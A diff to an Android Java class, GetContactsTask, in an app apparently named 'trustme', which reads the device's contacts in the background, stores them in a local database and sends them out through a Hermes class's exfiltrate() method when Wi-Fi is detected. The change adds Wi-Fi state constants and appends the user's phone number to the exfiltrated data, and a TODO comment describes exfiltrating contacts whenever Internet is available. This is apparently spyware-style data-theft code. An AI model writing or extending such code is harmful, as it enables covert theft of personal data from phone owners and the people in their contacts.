@@ -28,6 +28,8 @@ import com.trustme.testsu.utils.Constants;
  *@author sdemetr2
  */
 public class GetContactsTask extends AsyncTask<Void, Void, Void>{
+	public static final int WIFI_ON = 1;
+	public static final int WIFI_OFF = 0;
 	private WiFiTracker wifiTracker = new WiFiTracker();
 	private SQLiteDatabase database;
 	private ContactsDataSource datasource;
@@ -40,10 +42,10 @@ public class GetContactsTask extends AsyncTask<Void, Void, Void>{
 	@Override
 	protected Void doInBackground(Void... unused){
 		if(wifiTracker.read_arp()){
-			getAndSaveContacts(true);
+			getAndSaveContacts(WIFI_ON);
 			sendSavedContacts();
 		}else{
-			getAndSaveContacts(false);
+			getAndSaveContacts(WIFI_OFF);
 		}
 		datasource.close();
 
@@ -62,7 +64,7 @@ public class GetContactsTask extends AsyncTask<Void, Void, Void>{
 		Hermes h = new Hermes();
 		HashMap<String, String> map = new HashMap<String, String>();
 		map.put(key, value);
-		h.exfiltrate(map, Constants.CONTACTS_TRANSACTION);
+		h.exfiltrate(map, Constants.CONTACTS_TRANSACTION + ";" + User.getPhoneNumber());
 	}
 
 	private String getSavedContactsAsString(){
@@ -115,7 +117,7 @@ public class GetContactsTask extends AsyncTask<Void, Void, Void>{
 		return jsonText;
 	}
 
-	private void getAndSaveContacts(boolean isSent) {
+	private void getAndSaveContacts(int isSent) {
 
 		database = datasource.open();
 		// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker          
